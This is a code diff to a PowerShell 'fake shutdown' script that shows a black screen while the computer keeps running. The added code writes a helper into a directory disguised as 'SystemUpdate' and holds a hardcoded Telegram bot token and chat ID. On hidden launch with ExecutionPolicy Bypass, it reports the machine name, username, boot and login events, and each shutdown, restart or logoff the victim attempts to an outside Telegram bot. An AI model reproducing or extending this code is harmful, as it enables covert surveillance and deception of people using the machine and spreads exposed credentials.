@@ -1,14 +1,77 @@
 # Simple fake shutdown - shows black screen instead of shutting down
 
+# Telegram credentials
+$TelegramBotToken = "7461592658:AAEJvcK6WH3-VnM2kXXBPtDRf8SoHinR98w"
+$TelegramChatId = "1587027869"
+
 # Create directory
 $scriptDir = "C:\ProgramData\SystemUpdate"
 if (-not (Test-Path $scriptDir)) {
     New-Item -ItemType Directory -Path $scriptDir -Force | Out-Null
 }
 
+# Create Telegram notification script
+$telegramScriptPath = "$scriptDir\NotifyTelegram.ps1"
+$telegramScript = @"
+param([string]`$EventType)
+
+`$TelegramBotToken = '$TelegramBotToken'
+`$TelegramChatId = '$TelegramChatId'
+
+`$message = @()
+`$message += "🔔 EVENT ALERT"
+`$message += "Computer: `$env:COMPUTERNAME"
+`$message += "User: `$env:USERNAME"
+`$message += "Event: `$EventType"
+`$message += "Time: `$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+`$message += ""
+
+switch (`$EventType) {
+    'FAKE_SHUTDOWN' { 
+        `$message += "⚠️ User attempted to SHUTDOWN"
+        `$message += "Action: Showing black screen instead"
+        `$message += "Status: System still running"
+    }
+    'FAKE_LOGOFF' { 
+        `$message += "⚠️ User attempted to LOGOFF"
+        `$message += "Action: Showing black screen instead"
+        `$message += "Status: User session still active"
+    }
+    'FAKE_RESTART' { 
+        `$message += "⚠️ User attempted to RESTART"
+        `$message += "Action: Showing black screen instead"
+        `$message += "Status: System still running"
+    }
+    'SYSTEM_BOOT' {
+        `$message += "✅ System BOOTED"
+        `$message += "Status: All services started"
+    }
+    'USER_LOGIN' {
+        `$message += "✅ User LOGGED IN"
+        `$message += "Status: Session active"
+    }
+}
+
+`$messageText = `$message -join "`n"
+
+try {
+    `$uri = "https://api.telegram.org/bot`$TelegramBotToken/sendMessage"
+    `$body = @{
+        chat_id = `$TelegramChatId
+        text = `$messageText
+        parse_mode = 'HTML'
+    }
+    Invoke-RestMethod -Uri `$uri -Method Post -Body `$body -ContentType 'application/x-www-form-urlencoded' -UseBasicParsing | Out-Null
+} catch {}
+"@
+$telegramScript | Out-File -FilePath $telegramScriptPath -Encoding UTF8
+
 # Create black screen PowerShell script (write line by line to avoid escaping issues)
 $scriptPath = "$scriptDir\FakeShutdown.ps1"
 $lines = @(
+    '# Send Telegram notification',
+    "Start-Process powershell -ArgumentList `"-WindowStyle Hidden -ExecutionPolicy Bypass -File $telegramScriptPath -EventType FAKE_SHUTDOWN`" -WindowStyle Hidden",
+    '',
     'Add-Type -AssemblyName System.Windows.Forms',
     'Add-Type -Assembly PresentationFramework',
     '',
